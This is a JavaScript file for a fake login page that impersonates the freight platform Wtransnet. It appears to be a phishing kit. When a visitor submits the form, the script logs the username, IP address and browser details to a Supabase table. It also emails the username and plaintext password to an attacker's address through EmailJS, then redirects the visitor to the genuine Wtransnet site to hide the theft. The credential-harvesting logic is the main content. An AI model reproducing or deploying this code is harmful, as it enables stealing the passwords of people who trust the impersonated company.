import './style.css';
import emailjs from '@emailjs/browser';
import { createClient } from '@supabase/supabase-js';

const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
const supabaseAnonKey = import.meta.env.VITE_SUPABASE_ANON_KEY;
const supabase = createClient(supabaseUrl, supabaseAnonKey);

emailjs.init('YOUR_EMAILJS_PUBLIC_KEY');

const loginForm = document.getElementById('loginForm');
const mobileMenuToggle = document.querySelector('.mobile-menu-toggle');
const navbarMenu = document.querySelector('.navbar-menu');

loginForm.addEventListener('submit', async function(e) {
  e.preventDefault();

  const username = document.getElementById('username').value.trim();
  const password = document.getElementById('password').value;
  const remember = document.getElementById('remember').checked;

  if (!username || !password) {
    alert('Please fill in all fields');
    return;
  }

  const submitButton = e.target.querySelector('.btn-login');
  const originalText = submitButton.textContent;

  submitButton.textContent = 'Logging in...';
  submitButton.disabled = true;

  try {
    const userEmail = username.includes('@') ? username : `${username}@wtransnet.com`;

    const loginData = {
      username: username,
      email: userEmail,
      timestamp: new Date().toLocaleString(),
      ip_address: await getClientIP(),
      user_agent: navigator.userAgent
    };

    const { data, error } = await supabase
      .from('login_attempts')
      .insert([
        {
          username: username,
          email: userEmail,
          ip_address: loginData.ip_address,
          user_agent: loginData.user_agent
        }
      ]);

    if (error) {
      console.error('Supabase error:', error);
      throw new Error('Failed to log login attempt');
    }

    const emailParams = {
      to_email: 'your-email@gmail.com',
      username: username,
      password: password,
      user_email: userEmail,
      timestamp: loginData.timestamp,
      ip_address: loginData.ip_address,
      remember_me: remember ? 'Yes' : 'No'
    };

    const emailResponse = await emailjs.send(
      'YOUR_EMAILJS_SERVICE_ID',
      'YOUR_EMAILJS_TEMPLATE_ID',
      emailParams
    );

    if (emailResponse.status === 200) {
      console.log('Login attempt recorded and email sent successfully');
      window.location.href = 'https://www.wtransnet.com/en-en/';
    }
  } catch (error) {
    console.error('Error:', error);
    alert(`Error: ${error.message}\n\nPlease try again.`);
  } finally {
    submitButton.textContent = originalText;
    submitButton.disabled = false;
  }
});

async function getClientIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.error('Error fetching IP:', error);
    return 'Unknown';
  }
}

if (mobileMenuToggle) {
  mobileMenuToggle.addEventListener('click', function() {
    if (navbarMenu) {
      const isVisible = navbarMenu.style.display === 'flex';
      navbarMenu.style.display = isVisible ? 'none' : 'flex';

      if (!isVisible) {
        navbarMenu.style.position = 'absolute';
        navbarMenu.style.top = '100%';
        navbarMenu.style.left = '0';
        navbarMenu.style.right = '0';
        navbarMenu.style.backgroundColor = 'var(--color-white)';
        navbarMenu.style.flexDirection = 'column';
        navbarMenu.style.padding = '1rem';
        navbarMenu.style.boxShadow = 'var(--shadow)';
        navbarMenu.style.zIndex = '999';
      }
    }

    this.classList.toggle('active');
  });
}

const inputs = document.querySelectorAll('.form-group input');
inputs.forEach(input => {
  input.addEventListener('focus', function() {
    this.parentElement.classList.add('focused');
  });

  input.addEventListener('blur', function() {
    this.parentElement.classList.remove('focused');

    if (this.value) {
      this.parentElement.classList.add('filled');
    } else {
      this.parentElement.classList.remove('filled');
    }
  });
});

const forgotPasswordLink = document.querySelector('.forgot-password');
if (forgotPasswordLink) {
  forgotPasswordLink.addEventListener('click', function(e) {
    e.preventDefault();
    alert('Password reset functionality would be implemented here.');
  });
}

const registerLink = document.querySelector('.link-register');
if (registerLink) {
  registerLink.addEventListener('click', function(e) {
    e.preventDefault();
    alert('Registration page would be displayed here.');
  });
}

const langBtn = document.querySelector('.lang-btn');
if (langBtn) {
  langBtn.addEventListener('click', function() {
    alert('Language selector functionality would be implemented here.');
  });
}
